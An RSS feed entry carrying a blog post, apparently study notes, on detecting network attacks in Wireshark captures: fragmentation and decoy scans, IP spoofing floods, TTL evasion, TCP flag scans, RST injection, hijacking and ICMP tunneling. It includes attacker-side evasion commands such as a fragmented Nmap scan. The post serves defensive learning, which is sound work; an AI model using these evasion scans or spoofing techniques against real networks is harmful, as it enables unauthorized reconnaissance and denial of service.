<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Network Traffic Analysis on Ashour Blog</title>
        <link>https://mostafa-ashour.github.io/posts/network-traffic-analysis/</link>
        <description>Recent content in Network Traffic Analysis on Ashour Blog</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Fri, 24 Apr 2026 01:51:12 +0300</lastBuildDate>
        <atom:link href="https://mostafa-ashour.github.io/posts/network-traffic-analysis/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Detecting Network Abnormalities</title>
            <link>https://mostafa-ashour.github.io/posts/2026/04/detecting-network-abnormalities/</link>
            <pubDate>Fri, 24 Apr 2026 01:51:12 +0300</pubDate>
            
            <guid>https://mostafa-ashour.github.io/posts/2026/04/detecting-network-abnormalities/</guid>
            <description>&lt;h1 id=&#34;fragmentation-attacks&#34;&gt;Fragmentation Attacks&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Related PCAP File(s)—&lt;code&gt;nmap_frag_fw_bypass.pcapng&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;When investigating network anomalies, start by examining the IP layer&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The IP layer is:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Responsible for transferring data packets between network points (from one hop to another).&lt;/li&gt;
&lt;li&gt;Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication).&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;IP addresses can be found within the IP header of each packet when analyzing network traffic.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Keep in mind that the IP layer itself doesn&amp;rsquo;t detect lost, dropped, or altered/tampered packets.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h1 id="fragmentation-attacks">Fragmentation Attacks</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_frag_fw_bypass.pcapng</code>.</p>
</li>
<li>
<p>When investigating network anomalies, start by examining the IP layer</p>
</li>
<li>
<p>The IP layer is:</p>
<ul>
<li>Responsible for transferring data packets between network points (from one hop to another).</li>
<li>Using source and destination IP addresses to facilitate communication between hosts (inter-hosts communication).</li>
</ul>
</li>
<li>
<p>IP addresses can be found within the IP header of each packet when analyzing network traffic.</p>
</li>
<li>
<p>Keep in mind that the IP layer itself doesn&rsquo;t detect lost, dropped, or altered/tampered packets.</p>
</li>
<li>
<p>Instead, the transport or application layers handle these issues.</p>
</li>
<li>
<p>To dissect these packets, we can explore some of their fields:</p>
<ol>
<li><code>Length - IP header length</code>—This field contains the overall length of the IP header.</li>
<li><code>Total Length - IP Datagram/Packet Length</code>—This field specifies the entire length of the IP packet, including any relevant data.</li>
<li><code>Fragment Offset</code>—In many cases when a packet is large enough to be divided, the fragmentation offset will be set to provide instructions to reassemble the packet upon delivery to the destination host.</li>
<li><code>Source and Destination IP Addresses</code>—These fields contain the origination (source) and destination IP addresses for the two communicating hosts.
<img src="/Network%20Traffic%20Analysis/IPheader.jpg" alt="IPheader"></li>
</ol>
</li>
</ul>
<h2 id="commonly-abused-fields">Commonly Abused Fields</h2>
<ul>
<li>Attackers may craft packets to disrupt communication or evade intrusion detection systems (IDS) by malforming or modifying packets.</li>
<li>Understanding these fields and detecting their misuse is crucial for effective traffic analysis.</li>
</ul>
<h2 id="abuse-of-fragmentation">Abuse of Fragmentation</h2>
<ul>
<li>
<p>Fragmentation serves as a means for our legitimate hosts to communicate large data sets to one another by splitting the packets and reassembling them upon delivery.</p>
</li>
<li>
<p>This is commonly achieved through setting a <em><strong>Maximum Transmission Unit (MTU)</strong></em>.</p>
</li>
<li>
<p>The Maximum Transmission Unit (MTU) determines the standard size used to break down large data packets into smaller, equal-sized packets for transmission, except for the final packet that might be smaller than the others.</p>
</li>
<li>
<p>This process ensures that the receiving computer knows how to reassemble these packets in logical order.</p>
</li>
<li>
<p>Commonly, attackers might abuse this field for the following purposes:</p>
</li>
</ul>
<ol>
<li><code>IPS/IDS Evasion</code>—If intrusion detection controls don&rsquo;t reassemble fragmented packets, an attacker could bypass them by fragmenting enumeration techniques like Nmap, which would then be reassembled at the destination host.</li>
<li><code>Firewall Evasion</code>—Fragmentation can allow attackers to bypass firewall controls. If a firewall doesn&rsquo;t reassemble fragmented packets, enumeration attempts may succeed.</li>
<li><code>Firewall/IPS/IDS Resource Exhaustion</code>—An attacker could fragment packets to a very small MTU (e.g., 10, 15, or 20), the network control might not reassemble these packets due to resource constraints, and the attacker might succeed in their enumeration efforts.</li>
<li><code>Denial of Service</code>—Attackers can exploit fragmentation in older hosts to send oversized IP packets (&gt;65535 bytes) via ping, causing reassembly issues and denial-of-service.</li>
</ol>
<ul>
<li>If our network mechanism were to perform correctly. It should do the following:</li>
</ul>
<ol>
<li><code>Delayed Reassembly</code>—The IDS/IPS/Firewall should act the same as the destination host, in the sense that it waits for all fragments to arrive to reconstruct the transmission to perform packet inspection.</li>
</ol>
<h2 id="finding-irregularities-in-fragment-offsets">Finding Irregularities in Fragment Offsets</h2>
<ul>
<li>In order to better understand the abovementioned mechanics, we can open the related traffic capture file in Wireshark.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wireshark nmap_frag_fw_bypass.pcapng
</span></span></code></pre></div><p><img src="/Network%20Traffic%20Analysis/detecting_network_abnormalities_1.png" alt="detecting_network_abnormalities_1"></p>
<ul>
<li>For starters, we might notice several ICMP requests going to one host from another, this is indicative of the starting requests from a traditional Nmap scan.</li>
<li>This is the beginning of the host discovery process.</li>
<li>An attacker might run a command like this. (Attacker&rsquo;s Enumeration)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap &lt;host ip&gt;
</span></span></code></pre></div><ul>
<li>
<p>In doing so, they will generate the following.
<img src="/Network%20Traffic%20Analysis/detecting_network_abnormalities_1.png" alt="detecting_network_abnormalities_1"></p>
</li>
<li>
<p>Secondarily, an attacker might define a maximum transmission unit size like this in order to fragment their port scanning packets.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nmap -f <span style="color:#ae81ff">10</span> &lt;host ip&gt;
</span></span></code></pre></div><ul>
<li>
<p>In doing so they will generate IP packets with a maximum size of 10.</p>
</li>
<li>
<p>Seeing a ton of fragmentation from a host can be an indicator of this attack, and it would look like the following.
<img src="/Network%20Traffic%20Analysis/2-frag.png" alt="2-frag"></p>
</li>
<li>
<p>A more obvious sign of a fragmentation scan, regardless of it&rsquo;s evasion use, is that it connects one computer/host to many different ports.</p>
</li>
<li>
<p>Let&rsquo;s take the following for instance.
<img src="/Network%20Traffic%20Analysis/3-frag.png" alt="3-frag"></p>
</li>
<li>
<p>In this case, the destination host would respond with RST flags for ports which do not have an active service running on them (aka closed ports).</p>
</li>
<li>
<p>This pattern is a clear indication of a fragmented scan.</p>
</li>
<li>
<p>If our Wireshark is not reassembling packets for our inspection, we can make a quick change in our preferences for the IPv4 protocol.
<img src="/Network%20Traffic%20Analysis/4-frag.png" alt="4-frag"></p>
</li>
</ul>
<hr>
<h1 id="ip-source--destination-spoofing-attacks">IP Source &amp; Destination Spoofing Attacks</h1>
<ul>
<li>
<p>There are many cases where we might see irregular traffic for IPv4 and IPv6 packets, where in much cases might be done through the source and destination IP fields.</p>
</li>
<li>
<p>Consider the following when analyzing these fields:</p>
<ol>
<li><em><strong>Incoming Traffic</strong></em> to your network should obviously have a Source IP Address that doesn’t belong to your network address space (subnet space). If it does, it is most probably crafted.</li>
<li><em><strong>Outgoing Traffic</strong></em> from your network should obviously have a Source IP Address that belongs to your network address space. If it doesn’t, there is most probably a misconfiguration or the address is spoofed.</li>
</ol>
</li>
<li>
<p>An attacker might conduct these packet crafting attacks towards the source and destination IP addresses for many different reasons or desired outcomes, for instance:</p>
</li>
</ul>
<ol>
<li><code>Decoy Scanning</code>:
<ul>
<li>In an attempt to bypass firewall restrictions, an attacker might change the source IP of packets to enumerate further information about a host in another network segment.</li>
<li>Through changing the source to something within the same subnet as the target host, the attacker might succeed in firewall evasion.</li>
</ul>
</li>
<li><code>Random Source Attack DDoS</code>:
<ul>
<li>Through random source crafting an attacker might be able to send tons of traffic to the same port on the victim host.</li>
<li>This in many cases, is used to exhaust resources of our network controls or on the destination host.</li>
</ul>
</li>
<li><code>LAND Attacks</code>:
<ul>
<li><em><strong>LAND</strong></em> Attacks operate similarly to Random Source denial-of-service attacks in the nature that the source address is set to the same as the destination hosts.</li>
<li>In doing so the attacker might be able to exhaust network resources or cause crashes on the target host.</li>
</ul>
</li>
<li><code>SMURF Attacks</code>:
<ul>
<li>Similar to LAND and Random Source attacks, SMURF attacks work through the attacker sending large amounts of ICMP packets to many different hosts.</li>
<li>However, in this case the source address is set to the victim machines, and all of the hosts which receive this ICMP packet respond with an ICMP reply causing resource exhaustion on the crafted source address (victim).</li>
</ul>
</li>
<li><code>Initialization Vector Generation</code>:
<ul>
<li>In older wireless networks like those using Wired Equivalent Privacy (WEP), an attacker could do the following to break the encryption:
<ul>
<li>First, they would capture a network packet.</li>
<li>Then, they would decrypt it.</li>
<li>Next, they would change the packet&rsquo;s source and destination IP addresses and re-inject it back into the network.</li>
</ul>
</li>
<li>This allows the attacker to create new initialization vectors, which are used to build a decryption table.</li>
<li>This table is then used in a statistical attack to crack the WEP encryption.</li>
<li>You can detect this type of attack by observing a large number of identical packets being sent between computers on the network.</li>
</ul>
</li>
</ol>
<ul>
<li>It&rsquo;s important to understand that the previous attacks come from IP layer communication, not necessarily ARP poisoning.</li>
<li>However, these attacks are often used together with ARP poisoning in malicious activities.</li>
</ul>
<h2 id="finding-decoy-scanning-attempts">Finding Decoy Scanning Attempts</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>decoy_scanning_nmap.pcapng</code></p>
</li>
<li>
<p>To gather information, an attacker might disguise/change their source address to:</p>
<ul>
<li>Match a legitimate host.</li>
<li>Use a completely fabricated address (in some cases entirely different from any real host).</li>
</ul>
</li>
<li>
<p>This is to attempt to evade IDS/Firewall controls, and it can be easily observed.</p>
</li>
<li>
<p>In the case of decoy scanning, we will notice some strange behavior.</p>
<ol>
<li><code>Initial Fragmentation from a fake address</code></li>
<li><code>Some TCP traffic from the legitimate source address</code>
<img src="/Network%20Traffic%20Analysis/1-decoy.png" alt="1-decoy"></li>
</ol>
</li>
<li>
<p>In this type of attack, the attacker might try to hide their actual address using a fake one.</p>
</li>
<li>
<p>However, the replies from the targeted system, indicating that the ports are closed (using TCP RST flags), will still be sent to the attacker.
<img src="/Network%20Traffic%20Analysis/2-decoy.png" alt="2-decoy"></p>
</li>
<li>
<p>We will definitely notice this in the case of a large port block which has no services running on the victim host.
<img src="/Network%20Traffic%20Analysis/3-decoy.png" alt="3-decoy"></p>
</li>
<li>
<p>As such, another simple way that we can prevent this attack beyond just detecting it through our traffic analysis efforts is the following.</p>
</li>
</ul>
<ol>
<li><code>Have our IDS/IPS/Firewall act as the destination host would</code>—In the sense that reconstructing the packets gives a clear indication of malicious activity.</li>
<li><code>Watch for connections started by one host, and taken over by another</code>—The attacker after all has to reveal their true source address in order to see that a port is open. This is strange behavior and we can define our rules to prevent it.</li>
</ol>
<h2 id="finding-random-source-attacks">Finding Random Source Attacks</h2>
<ul>
<li>
<p>Related PCAP File(s):</p>
<ul>
<li><code>ICMP_rand_source.pcapng</code></li>
<li><code>ICMP_rand_source_larg_data.pcapng</code></li>
<li><code>TCP_rand_source_attacks.pcapng</code></li>
</ul>
</li>
<li>
<p>Denial-of-service attacks can also use spoofing of source and destination addresses.</p>
</li>
<li>
<p>A common example is a random source attack.</p>
</li>
<li>
<p>This attack has many variations, but one notable type is similar to the opposite of a SMURF attack. In this case, many hosts send a ping request to a host that doesn&rsquo;t exist.</p>
</li>
<li>
<p>The nonexistent host then attempts to reply to all the original hosts, but receives no response.
<img src="/Network%20Traffic%20Analysis/1-random-source.png" alt="1-random-source"></p>
</li>
<li>
<p>We should also consider that attackers might fragment these random hosts communications in order to draw out more resource exhaustion.
<img src="/Network%20Traffic%20Analysis/2-random-source.png" alt="2-random-source"></p>
</li>
<li>
<p>In many cases, such as LAND attacks, attackers exhaust resources by targeting a specific service on a port.</p>
</li>
<li>
<p>Instead of spoofing the source address to match the destination, they may randomize it, resulting in the following.
<img src="/Network%20Traffic%20Analysis/3-random-source.png" alt="3-random-source"></p>
</li>
<li>
<p>In this case, we have a few indicators of nefarious behavior:</p>
<ol>
<li><code>Single Port Utilization from random hosts</code></li>
<li><code>Incremental Base Port with a lack of randomization</code></li>
<li><code>Identical Length Fields</code></li>
</ol>
</li>
<li>
<p>In many real world cases, like a web server, we may have many different users utilizing the same port.</p>
</li>
<li>
<p>However, these requests are contrary of our indicators.</p>
</li>
<li>
<p>Such that:</p>
<ul>
<li>They will have different lengths.</li>
<li>The base ports will not exhibit this behavior.</li>
</ul>
</li>
</ul>
<h2 id="finding-smurf-attacks">Finding Smurf Attacks</h2>
<ul>
<li>
<p>SMURF attacks are a type of distributed denial-of-service attack.</p>
</li>
<li>
<p>They work by tricking multiple computers into sending responses to a victim&rsquo;s computer, overwhelming it with traffic.</p>
</li>
<li>
<p>Here&rsquo;s how an attacker carries out this type of attack:</p>
<ol>
<li><code>The attacker will send an ICMP request to live hosts with a spoofed address of the victim host</code></li>
<li><code>The live hosts will respond to the legitimate victim host with an ICMP reply</code></li>
<li><code>This may cause resource exhaustion on the victim host</code></li>
</ol>
</li>
<li>
<p>One of the things we can look for in our traffic behavior is an excessive amount of ICMP replies from a single host to our affected host.</p>
</li>
<li>
<p>Sometimes attackers will include fragmentation and data on these ICMP requests to make the traffic volume larger.
<img src="/Network%20Traffic%20Analysis/1-SMURF.png" alt="1-SMURF"></p>
</li>
<li>
<p>We might notice many different hosts pinging our single host, and in this case it represents the basic nature of SMURF attacks.
<img src="/Network%20Traffic%20Analysis/smurf.webp" alt="smurf"></p>
</li>
<li>
<p>Smurf Attack Explanation—<a href="https://techofide.com/blogs/what-is-smurf-attack-what-is-the-denial-of-service-attack-practical-ddos-attack-step-by-step-guide/">What is Smurf Attack? | What is The Denial Of Service Attack?</a>.</p>
</li>
</ul>
<h2 id="finding-land-attacks">Finding LAND Attacks</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>LAND-DoS.pcapng</code>.</p>
</li>
<li>
<p>A LAND attack is a type of denial-of-service attack where the attacker changes the sender/source&rsquo;s address to be the same as the receiver/destination&rsquo;s address.</p>
</li>
<li>
<p>This attack overwhelms the target with a large amount of traffic and by using up all available ports.</p>
</li>
<li>
<p>If all ports are busy, it becomes very difficult for legitimate connections to be made to the targeted computer.
<img src="/Network%20Traffic%20Analysis/1-LAND.png" alt="1-LAND"></p>
</li>
</ul>
<hr>
<h1 id="ip-time-to-live-attacks">IP Time-to-Live Attacks</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>ip_ttl.pcapng</code>.</p>
</li>
<li>
<p>Attackers use Time-to-Live (TTL) attacks for evasion.</p>
</li>
<li>
<p>They intentionally set low TTL values on IP packets to bypass firewalls, Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS).
<img src="/Network%20Traffic%20Analysis/ttl-attack-diagram.png" alt="ttl-attack-diagram"></p>
</li>
</ul>
<ol>
<li>The attacker will craft an IP packet with an intentionally low TTL value (1, 2, 3 and so on).</li>
<li>Through each host that this packet passes through this TTL value will be decremented by one until it reaches zero.</li>
<li>Upon reaching zero this packet will be discarded. The attacker will try to get this packet discarded before it reaches a firewall or filtering system to avoid detection/controls.</li>
<li>When the packets expire, the routers along the path generate ICMP Time Exceeded messages and send them back to the source IP address.</li>
</ol>
<h4 id="finding-irregularities-in-ip-ttl">Finding Irregularities in IP TTL</h4>
<ul>
<li>
<p>To begin:</p>
<ul>
<li>Capture network traffic.</li>
<li>Analyze it in Wireshark.</li>
</ul>
</li>
<li>
<p>Detecting this in small amounts can be difficult, but fortunately for us attackers will most times utilize TTL manipulation in port scanning efforts.</p>
</li>
<li>
<p>Right away we might notice something like the following.
<img src="/Network%20Traffic%20Analysis/1-ttl.png" alt="1-ttl"></p>
</li>
<li>
<p>Alternatively, a returned SYN, ACK message from a legitimate service port on the affected host could indicate the attacker bypassed a firewall control.
<img src="/Network%20Traffic%20Analysis/2-ttl.png" alt="2-ttl"></p>
</li>
<li>
<p>Opening a packet and inspecting the IPv4 tab in Wireshark would reveal a likely cause: a very low TTL.
<img src="/Network%20Traffic%20Analysis/3-ttl.png" alt="3-ttl"></p>
</li>
<li>
<p>We can mitigate IP packet crafting attacks by implementing a control that discards packets with insufficient TTL values.</p>
</li>
</ul>
<hr>
<h1 id="tcp-handshake-abnormalities">TCP Handshake Abnormalities</h1>
<ul>
<li>
<p>When attackers are gathering/gaining information about our TCP services, we might notice a few odd behaviors during our traffic analysis efforts.</p>
</li>
<li>
<p>Firstly, let&rsquo;s consider how normal TCP connections work with their 3-way handshake.
<img src="/Network%20Traffic%20Analysis/tcp_handshake_1.jpg" alt="tcp_handshake_1"></p>
</li>
<li>
<p>To start a TCP connection, the client sends a TCP SYN request to the machine it wants to connect to.</p>
</li>
<li>
<p>This begins the TCP connection process.</p>
</li>
<li>
<p>If this port is open, and in fact able to be connected to, the machine responds with a TCP SYN/ACK to acknowledge that the connection is valid and able to be used.</p>
</li>
<li>
<p>However, we should consider all TCP flags.</p>
</li>
</ul>
<table>
  <thead>
      <tr>
          <th><strong>Flags</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>URG (Urgent)</code></td>
          <td>This flag is to denote urgency with the current data in stream.</td>
      </tr>
      <tr>
          <td><code>ACK (Acknowledgement)</code></td>
          <td>This flag acknowledges receipt of data.</td>
      </tr>
      <tr>
          <td><code>PSH (Push)</code></td>
          <td>This flag instructs the TCP stack to immediately deliver the received data to the application layer, and bypass buffering.</td>
      </tr>
      <tr>
          <td><code>RST (Reset)</code></td>
          <td>This flag is used for termination of the TCP connection.</td>
      </tr>
      <tr>
          <td><code>SYN (Synchronize)</code></td>
          <td>This flag is used to establish an initial connection with TCP.</td>
      </tr>
      <tr>
          <td><code>FIN (Finish)</code></td>
          <td>This flag is used to denote the finish of a TCP connection. It is used when no more data needs to be sent.</td>
      </tr>
      <tr>
          <td><code>ECN (Explicit Congestion Notification)</code></td>
          <td>This flag is used to denote congestion within our network, it is to let the hosts know to avoid unnecessary re-transmissions.</td>
      </tr>
  </tbody>
</table>
<ul>
<li>As such, when we are performing our traffic analysis efforts we can look for the following strange conditions:</li>
</ul>
<ol>
<li><code>Too many flags of a kind or kinds</code>—This could show us that scanning is occurring within our network.</li>
<li><code>The usage of different and unusual flags</code>—Sometimes this could indicate a TCP RST attack, hijacking, or simply some form of control evasion for scanning.</li>
<li><code>Solo host to multiple ports, or solo host to multiple hosts</code>—Easy enough, we can find scanning as we have done before by noticing where these connections are going from one host. In a lot of cases, we may even need to consider decoy scans and random source attacks.</li>
</ol>
<h2 id="excessive-syn-flags">Excessive SYN Flags</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_syn_scan.pcapng</code>.</p>
</li>
<li>
<p>One of the first suspicious network activities to look for is an excessive number of SYN flags.</p>
</li>
<li>
<p>This often indicates an Nmap scan.</p>
</li>
<li>
<p>An attacker sends TCP SYN packets to various ports on the target machine.</p>
</li>
<li>
<p>If a port is open, the target responds with a SYN-ACK packet, as expected in a normal TCP handshake.</p>
</li>
<li>
<p>However, the attacker&rsquo;s scanner then sends an RST packet, prematurely ending the connection.</p>
</li>
<li>
<p>It&rsquo;s important to note that the target machine will also respond with RST packets to SYN packets sent to closed ports, which can make analysis more complex.
<img src="/Network%20Traffic%20Analysis/1-TCPhandshake.png" alt="1-TCPhandshake"></p>
</li>
<li>
<p>However it is worth noting that there are two primary scan types we might detect that use the SYN flag.</p>
</li>
<li>
<p>These are:</p>
</li>
</ul>
<ol>
<li><code>SYN Scans</code> - In these scans the behavior will be as we see, however the attacker will pre-emptively end the handshake with the RST flag.</li>
<li><code>SYN Stealth Scans</code> - In this case the attacker will attempt to evade detection by only partially completing the TCP handshake.</li>
</ol>
<h2 id="no-flags">No Flags</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_null_scan.pcapng</code>.</p>
</li>
<li>
<p>Conversely, an attacker might send a NULL scan, which involves transmitting TCP packets with no flags set.</p>
</li>
<li>
<p>The following describes TCP connection behavior upon receiving a NULL packet.</p>
</li>
</ul>
<ol>
<li><code>If the port is open</code>—The system will not respond at all since there is no flags.</li>
<li><code>If the port is closed</code>—The system will respond with an RST packet.</li>
</ol>
<ul>
<li>As such a NULL scan might look like the following.
<img src="/Network%20Traffic%20Analysis/2-TCPhandshake.png" alt="2-TCPhandshake"></li>
</ul>
<h2 id="too-many-acks">Too Many ACKs</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_ack_scan.pcapng</code>.</p>
</li>
<li>
<p>Alternatively, excessive acknowledgements between two hosts may indicate an attacker using an ACK scan.</p>
</li>
<li>
<p>In the case of an ACK scan TCP connections will behave like the following.</p>
</li>
</ul>
<ol>
<li><code>If the port is open</code>—The affected machine will either not respond, or will respond with an RST packet.</li>
<li><code>If the port is closed</code>—The affected machine will respond with an RST packet.</li>
</ol>
<ul>
<li>So, we might see the following traffic which would indicate an ACK scan.
<img src="/Network%20Traffic%20Analysis/3-TCPhandshake.png" alt="3-TCPhandshake"></li>
</ul>
<h2 id="excessive-fins">Excessive FINs</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_fin_scan.pcapng</code>.</p>
</li>
<li>
<p>Using another part of the handshake, an attacker might utilize a FIN scan. In this case, all TCP packets will be marked with the FIN flag.</p>
</li>
<li>
<p>We might notice the following behavior from our affected machine.</p>
</li>
</ul>
<ol>
<li><code>If the port is open</code>—Our affected machine simply will not respond.</li>
<li><code>If the port is closed</code>—Our affected machine will respond with an RST packet.</li>
</ol>
<p><img src="/Network%20Traffic%20Analysis/4-TCPhandshake.png" alt="4-TCPhandshake"></p>
<h2 id="just-too-many-flags">Just too many flags</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>nmap_xmas_scan.pcapng</code>.</p>
</li>
<li>
<p>An attacker attempting a &ldquo;spaghetti at the wall&rdquo; approach might use an Xmas tree scan, setting all TCP flags in their transmissions.</p>
</li>
<li>
<p>The affected host&rsquo;s response to this scan would then be as follows.</p>
</li>
</ul>
<ol>
<li><code>If the port is open</code>—The affected machine will not respond, or at least it will with an RST packet.</li>
<li><code>If the port is closed</code>—The affected machine will respond with an RST packet.</li>
</ol>
<ul>
<li>Xmas tree scans are pretty easy to spot and look like the following.
<img src="/Network%20Traffic%20Analysis/5-TCPhandshake.png" alt="5-TCPhandshake"></li>
</ul>
<hr>
<h1 id="tcp-connection-resets--hijacking">TCP Connection Resets &amp; Hijacking</h1>
<ul>
<li>TCP lacks sufficient protection against connection termination or hijacking by an attacker.</li>
<li>Consequently, connections may be:
<ul>
<li>Terminated by RST packets.</li>
<li>hijacked through connection Hijacking.</li>
</ul>
</li>
</ul>
<h2 id="tcp-connection-termination">TCP Connection Termination</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>RST_Attack.pcapng</code>.</p>
</li>
<li>
<p>Suppose an adversary wanted to cause denial-of-service conditions within our network.</p>
</li>
<li>
<p>They might employ a simple TCP RST Packet injection attack, or TCP connection termination in simple terms.</p>
</li>
<li>
<p>This attack is a combination of a few conditions:</p>
<ol>
<li><code>The attacker will spoof the source address to be the affected machine's</code></li>
<li><code>The attacker will modify the TCP packet to contain the RST flag to terminate the connection</code></li>
<li><code>The attacker will specify the destination port to be the same as one currently in use by one of our machines.</code></li>
</ol>
</li>
<li>
<p>As such, we might notice an excessive amount of packets going to one port.
<img src="/Network%20Traffic%20Analysis/1-RST.png" alt="1-RST"></p>
</li>
<li>
<p>To verify a TCP RST attack, check the transmitter&rsquo;s physical address.</p>
</li>
<li>
<p>If the TCP RST packets originate from a MAC address different from the one registered to the IP address (e.g., <code>192.168.10.4</code> with MAC <code>aa:aa:aa:aa:aa:aa</code>) in our network device list, it indicates an attack.
<img src="/Network%20Traffic%20Analysis/2-RST.png" alt="2-RST"></p>
</li>
<li>
<p>This likely indicates a TCP RST attack.</p>
</li>
<li>
<p>However, attackers might spoof MAC addresses to evade detection, potentially causing retransmissions and issues similar to those seen with ARP poisoning.</p>
</li>
</ul>
<h2 id="tcp-connection-hijacking">TCP Connection Hijacking</h2>
<ul>
<li>
<p>Related PCAP File(s)—<code>TCP-hijacking.pcap</code>.</p>
</li>
<li>
<p>For more advanced actors, they might employ TCP connection hijacking.</p>
</li>
<li>
<p>In this case the attacker will actively monitor the target connection they want to hijack.</p>
</li>
<li>
<p>The attacker will then conduct sequence number prediction in order to inject their malicious packets in the correct order.</p>
</li>
<li>
<p>During this injection they will spoof the source address to be the same as our affected machine.</p>
</li>
<li>
<p>To maintain the hijacking, the attacker must prevent ACKs from reaching the target/affected machine, typically by delaying or blocking them.</p>
</li>
<li>
<p>Consequently, this attack is often paired with ARP poisoning, which may be evident in traffic analysis.
<img src="/Network%20Traffic%20Analysis/4-RST.png" alt="4-RST"></p>
</li>
</ul>
<hr>
<h1 id="icmp-tunneling">ICMP Tunneling</h1>
<ul>
<li>
<p>Related PCAP File(s)—<code>icmp_tunneling.pcapng</code>.</p>
</li>
<li>
<p>Tunneling is a technique employed by adversaries in order to exfiltrate data from one location to another.</p>
</li>
<li>
<p>There are many different kinds of tunneling, and each different kind uses a different protocol.</p>
</li>
<li>
<p>Commonly, attackers may utilize:</p>
<ul>
<li>Proxies to bypass our network controls.</li>
<li>Protocols that our systems and controls allow.</li>
</ul>
</li>
</ul>
<h2 id="basics-of-tunneling">Basics of Tunneling</h2>
<ul>
<li>
<p>Tunneling allows attackers to transmit/communicate data to other hosts, often indicated by command and control over a compromised machine.</p>
</li>
<li>
<p>While SSH tunneling is common, proxy-based, HTTP, HTTPS, DNS, and other methods can also be used.
<img src="/Network%20Traffic%20Analysis/basic-tunnel-1.png" alt="basic-tunnel-1"></p>
</li>
<li>
<p>The idea behind tunneling is that an attacker will be able to expand their command and control and bypass our network controls through the protocol of their choosing.</p>
</li>
</ul>
<h2 id="icmp-tunneling-1">ICMP Tunneling</h2>
<ul>
<li>ICMP tunneling involves an attacker adding/appending data they want to steal/exfiltrate to the data field of an ICMP request.</li>
<li>The goal is to conceal/hide this data by disguising it within normal ICMP traffic, making it harder to detect on the network.
<img src="/Network%20Traffic%20Analysis/icmp_ping_example.jpg" alt="icmp_ping_example"></li>
</ul>
<h2 id="finding-icmp-tunneling">Finding ICMP Tunneling</h2>
<ul>
<li>
<p>Since ICMP tunneling is primarily done through an attacker adding data into the data field for ICMP, we can find it by looking at the contents of data per request and reply.
<img src="/Network%20Traffic%20Analysis/1-ICMP-tunneling.png" alt="1-ICMP-tunneling"></p>
</li>
<li>
<p>We can filter our Wireshark capture to only ICMP requests and replies by entering ICMP into the filter bar.
<img src="/Network%20Traffic%20Analysis/2-ICMP-tunneling.png" alt="2-ICMP-tunneling"></p>
</li>
<li>
<p>Suppose we noticed fragmentation occurring within our ICMP traffic as it is above, this would indicate a large amount of data being transferred via ICMP.</p>
</li>
<li>
<p>In order to understand this behavior, we should look at a normal ICMP request.</p>
</li>
<li>
<p>We may note that the data is something reasonable like 48 bytes.
<img src="/Network%20Traffic%20Analysis/3-ICMP-tunneling.png" alt="3-ICMP-tunneling"></p>
</li>
<li>
<p>However a suspicious ICMP request might have a large data length like 38000 bytes.
<img src="/Network%20Traffic%20Analysis/4-ICMP-tunneling.png" alt="4-ICMP-tunneling"></p>
</li>
<li>
<p>If we would like to take a look at the data in transit, we can look on the right side of our screen in Wireshark.</p>
</li>
<li>
<p>In this case, we might notice something like a Username and Password being pinged to an external or internal host.</p>
</li>
<li>
<p>This is a direct indication of ICMP tunneling.
<img src="/Network%20Traffic%20Analysis/5-ICMP-tunneling.png" alt="5-ICMP-tunneling"></p>
</li>
<li>
<p>On the other hand, more advanced adversaries will utilize encoding or encryption when transmitting exfiltrated data, even in the case of ICMP tunneling.</p>
</li>
<li>
<p>Suppose we noticed the following.
<img src="/Network%20Traffic%20Analysis/6-ICMP-tunneling.png" alt="6-ICMP-tunneling"></p>
</li>
<li>
<p>We could copy this value out of Wireshark and decode it within Linux with the base64 utility.</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=&#39;</span> | base64 -d
</span></span></code></pre></div><ul>
<li>This would also be a case where ICMP tunneling is observed.</li>
<li>In many cases, if the ICMP data length is larger than 48-bytes, we know something fishy is going on, and should always look into it.</li>
</ul>
